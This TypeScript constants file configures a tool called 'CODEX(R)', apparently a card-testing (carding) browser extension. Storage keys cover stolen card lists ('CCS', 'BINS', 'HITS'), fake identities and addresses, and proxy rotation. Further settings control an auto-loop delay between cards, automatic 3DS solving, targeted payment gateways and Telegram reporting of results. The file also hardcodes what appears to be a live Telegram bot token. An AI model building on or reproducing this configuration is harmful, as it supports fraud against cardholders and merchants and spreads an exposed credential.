/**
 * CODEX(R) System — Centralized Constants
 * All storage keys, URLs, versions, and configuration values in one place.
 * Eliminates magic strings scattered across the codebase.
 */

// ─── System Info ──────────────────────────────────────────────────────────────
export const SYSTEM_VERSION = '1.1.0';
export const SYSTEM_BUILD_DATE = '2023-10-27';
export const ENABLE_ENCRYPTION = true; // toggle encryption for storage
export const SYNC_MAX_RETRIES = 3; // maximum sync retries
export const SYSTEM_NAME = 'CODEX(R)';
export const SYSTEM_BRAND = 'CODEX(R) SYSTEM';

// ─── Telegram Bot ─────────────────────────────────────────────────────────────
export const TELEGRAM_BOT_TOKEN = '8953633941:AAE8E0o00iIlVBnP57_y3Q8UIk5I_-ZwRCw';
export const TELEGRAM_BOT_USERNAME = 'CodexrOutBot';
export const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ─── Desktop Sync Server ─────────────────────────────────────────────────────
export const DESKTOP_SYNC_URL = 'http://127.0.0.1:18080/api/settings';
export const DESKTOP_SYNC_INTERVAL_MS = 5000; // 5 seconds (was 2s — too aggressive)

// ─── Storage Keys ─────────────────────────────────────────────────────────────
export const STORAGE_KEYS = {
  // Auth & Users
  USERS: 'CODEX_users',
  SESSION: 'CODEX_session',
  PENDING_OTPS: 'CODEX_pending_otps',

  // Test Cases & Data
  TEST_CASES: 'CODEX_test_cases',
  BINS: 'CODEX_bins',
  CCS: 'CODEX_ccs',
  ACTIVE_SOURCE_MODE: 'CODEX_active_source_mode',

  // Identity & Automation
  IDENTITY: 'CODEX_identity',
  RANDOM_NAMES: 'CODEX_random_names',
  RANDOM_ADDRESSES: 'CODEX_random_addresses',
  AUTOFILL_ENABLED: 'CODEX_autofill_enabled',
  AUDIO_NOTIFICATIONS: 'CODEX_audio_notifications',

  // AI Engine
  AI_HEURISTIC_MODE: 'CODEX_ai_heuristic_mode',
  AI_IFRAME_TRAVERSAL: 'CODEX_ai_iframe_traversal',
  AI_CUSTOM_FORM_SOLVER: 'CODEX_ai_custom_form_solver',

  // Results
  HITS: 'CODEX_hits',
  AUTO_PROGRESS: 'CODEX_auto_progress',
  ACTIVITY_LOGS: 'CODEX_activity_logs',

  // Telegram
  TELEGRAM_CHAT_ID: 'CODEX_telegram_chat_id',
  TELEGRAM_NOTIFY: 'CODEX_telegram_notify',
  TELEGRAM_BOT_TOKEN: 'CODEX_telegram_bot_token',

  // Bot Settings
  BOT_TOKEN: 'CODEX_bot_token',
  BOT_USERNAME: 'CODEX_bot_username',
  BOT_API_URL: 'CODEX_bot_api_url',
  OFFICIAL_WEB: 'CODEX_official_web',

  // Proxy
  PROXY_LIST: 'CODEX_proxy_list',
  PROXY_ENABLED: 'CODEX_proxy_enabled',
  PROXY_CURRENT_INDEX: 'CODEX_proxy_current_index',

  // User Session (desktop sync)
  USER_SESSION: 'CODEX_user_session',
} as const;

export type StorageKey = typeof STORAGE_KEYS[keyof typeof STORAGE_KEYS];

// ─── Timing Constants ─────────────────────────────────────────────────────────
export const TIMING = {
  /** Delay between test cards in auto-loop (ms) */
  INTER_CARD_DELAY: 400,
  /** Delay waiting for dynamic billing fields to appear (ms) */
  BILLING_FIELDS_DELAY: 2000,
  /** Default checkout observer timeout (ms) */
  OBSERVER_TIMEOUT: 20000,
  /** Overlay poll interval for SPA detection (ms) */
  SPA_POLL_INTERVAL: 2000,
  /** Service worker keepalive alarm (minutes) */
  KEEPALIVE_INTERVAL_MIN: 1,
  /** OTP expiration time (ms) — 5 minutes */
  OTP_EXPIRY_MS: 5 * 60 * 1000,
  /** Max OTP verification attempts before lockout */
  MAX_OTP_ATTEMPTS: 5,
} as const;

// ─── Feature Flags ───────────────────────────────────────────────────────────
export const ENABLE_PARALLEL_WORKERS = true;
export const MAX_WORKERS = 4; // max concurrent Web Workers
export const ENABLE_AUTO_3DS = true; // auto‑solve 3DS if possible


// ─── Supported Payment Providers ──────────────────────────────────────────────
export const SUPPORTED_PROVIDERS = [
  'stripe',
  'adyen',
  'braintree',
  'paypal',
  'airwallex',
  'square',
  'recurly',
  'xsolla',
  'fastspring',
  'generic',
] as const;

export type PaymentProvider = typeof SUPPORTED_PROVIDERS[number];

// ─── Card Brands ──────────────────────────────────────────────────────────────
export const CARD_BRANDS = {
  VISA: 'VISA',
  MASTERCARD: 'MASTERCARD',
  AMEX: 'AMEX',
  DISCOVER: 'DISCOVER',
  DINERS: 'DINERS',
  JCB: 'JCB',
  UNIONPAY: 'UNIONPAY',
  GENERIC: 'GENERIC',
} as const;

export type CardBrand = typeof CARD_BRANDS[keyof typeof CARD_BRANDS];

// ─── Gateway-Compatible Verified List ─────────────────────────────────────────
export const VERIFIED_GATEWAYS = [
  { name: 'Stripe', color: 'indigo' },
  { name: 'OnlyFans', color: 'blue' },
  { name: 'Shopify', color: 'emerald' },
  { name: 'Braintree', color: 'purple' },
  { name: 'Adyen', color: 'amber' },
  { name: 'WooCommerce', color: 'cyan' },
  { name: 'Square', color: 'rose' },
] as const;
